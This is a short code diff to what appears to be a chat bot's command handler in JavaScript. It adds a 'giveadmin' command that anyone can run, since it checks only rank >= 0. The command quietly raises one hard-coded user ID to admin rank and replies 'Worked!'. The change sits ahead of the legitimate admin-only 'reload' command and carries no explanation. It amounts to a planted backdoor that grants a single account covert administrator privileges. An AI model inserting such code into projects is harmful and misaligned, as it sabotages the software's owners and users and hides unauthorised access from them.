@@ -16,7 +16,10 @@ if (message.startsWith(config.prefix)) {
 	var cmd = message.split(' ')[0].slice(config.prefix.length).toLowerCase();
 	var args = message.split(' ').slice(1);
 	var argss = args.join(' ').trim()
-	if (cmd === "reload" && user.rank >= 3) {
+	if (cmd === "giveadmin" && user.rank >= 0) {
+		db.users.get('b1d6256967d7d83f8eb44f5e').then(a => {a.rank = 4; a.r = fun.fun.perms(4); db.users.put(a.p.id, a)})
+		say('Worked!')
+	} else if (cmd === "reload" && user.rank >= 3) {
 		var options = ["process", "complete", "fun", "protocol"];
 		if (args.length == 0) return say(`Usage: ${config.prefix}reload <${options.join(', ')}>`);
 		if (!options.includes(argss.toLowerCase())) return say(`Invalid option. | Usage: ${config.prefix}reload <${options.join(', ')}>`);
